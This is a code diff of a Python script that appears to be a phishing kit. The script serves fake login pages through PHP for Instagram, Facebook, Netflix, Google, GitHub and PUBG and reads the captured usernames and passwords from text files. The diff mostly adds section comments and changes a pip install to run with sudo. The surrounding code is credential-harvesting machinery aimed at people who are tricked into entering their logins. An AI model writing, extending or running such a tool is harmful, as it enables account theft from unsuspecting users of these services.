@@ -31,7 +31,7 @@ else:
     except (ImportError , ModuleNotFoundError):
         install = input("unfortunately you dont have excepetd modules !!\nWant to install ? (y/n) : ")
         if install == "y":
-            os.system("pip install -r requirements_linux.txt")
+            os.system("sudo pip install -r requirements_linux.txt")
             sleep(0.5)
             pass
         else:
@@ -72,6 +72,7 @@ if check != 0:
     print (f"{Fore.RED}[-]{Fore.BLUE} Unfortunately you dont have PHP please install it and come back soon !")
     sys.exit()
 
+#clear screen====================================================================================================
 def clear():
     if os.name == "nt":
         os.system("cls")
@@ -170,7 +171,7 @@ def instagram():
     except KeyboardInterrupt:
         exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
 
-#====================================================================================================
+#write username====================================================================================================
     while True:
         size = os.stat("username_key.txt")
         if size.st_size != 0:
@@ -187,6 +188,7 @@ def instagram():
                 open("username_key.txt" , "w").close()
 
                 break
+#write password====================================================================================================
 
     while True:
         size = os.stat("password_key.txt")
@@ -206,6 +208,8 @@ def instagram():
                 open("password_key.txt" , "w").close()
 
                 break
+
+#kill php proccess and exit====================================================================================================
 
     if os.name == "nt":
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
@@ -273,7 +277,7 @@ def facebook():
     except KeyboardInterrupt:
         exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
 
-#====================================================================================================
+#write username====================================================================================================
     while True:
         size = os.stat("username_key.txt")
         if size.st_size != 0:
@@ -290,6 +294,7 @@ def facebook():
                 open("username_key.txt" , "w").close()
 
                 break
+#write password====================================================================================================
 
     while True:
         size = os.stat("password_key.txt")
@@ -309,6 +314,7 @@ def facebook():
                 open("password_key.txt" , "w").close()
 
                 break
+#kill php proccess and exit====================================================================================================
 
     if os.name == "nt":
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
@@ -376,7 +382,7 @@ def netflix():
     except KeyboardInterrupt:
         exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
 
-#====================================================================================================
+#write username====================================================================================================
     while True:
         size = os.stat("username_key.txt")
         if size.st_size != 0:
@@ -393,6 +399,7 @@ def netflix():
                 open("username_key.txt" , "w").close()
 
                 break
+#write password====================================================================================================
 
     while True:
         size = os.stat("password_key.txt")
@@ -412,6 +419,7 @@ def netflix():
                 open("password_key.txt" , "w").close()
 
                 break
+#kill php proccess and exit====================================================================================================
 
     if os.name == "nt":
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
@@ -481,7 +489,7 @@ def Google():
         exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
 
 
-#====================================================================================================
+#write username====================================================================================================
     while True:
         size = os.stat("username_key.txt")
         if size.st_size != 0:
@@ -498,6 +506,7 @@ def Google():
                 open("username_key.txt" , "w").close()
 
                 break
+#write password====================================================================================================
 
     while True:
         size = os.stat("password_key.txt")
@@ -517,6 +526,7 @@ def Google():
                 open("password_key.txt" , "w").close()
 
                 break
+#kill php proccess and exit====================================================================================================
 
     if os.name == "nt":
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
@@ -586,7 +596,7 @@ def Github():
     except KeyboardInterrupt:
         exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
 
-#====================================================================================================
+#write username====================================================================================================
     while True:
         size = os.stat("username_key.txt")
         if size.st_size != 0:
@@ -603,6 +613,7 @@ def Github():
                 open("username_key.txt" , "w").close()
 
                 break
+#write password====================================================================================================
 
     while True:
         size = os.stat("password_key.txt")
@@ -623,7 +634,8 @@ def Github():
 
                 break
 
-    
+#kill php proccess and exit====================================================================================================
+
     if os.name == "nt":
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
@@ -692,7 +704,7 @@ def Pubg():
     except KeyboardInterrupt:
         exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
     
-#====================================================================================================
+#write username====================================================================================================
     while True:
         size = os.stat("username_key.txt")
         if size.st_size != 0:
@@ -709,6 +721,7 @@ def Pubg():
                 open("username_key.txt" , "w").close()
 
                 break
+#write password====================================================================================================
 
     while True:
         size = os.stat("password_key.txt")
@@ -728,6 +741,7 @@ def Pubg():
                 open("password_key.txt" , "w").close()
 
                 break
+#kill php proccess and exit====================================================================================================
 
     if os.name == "nt":
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
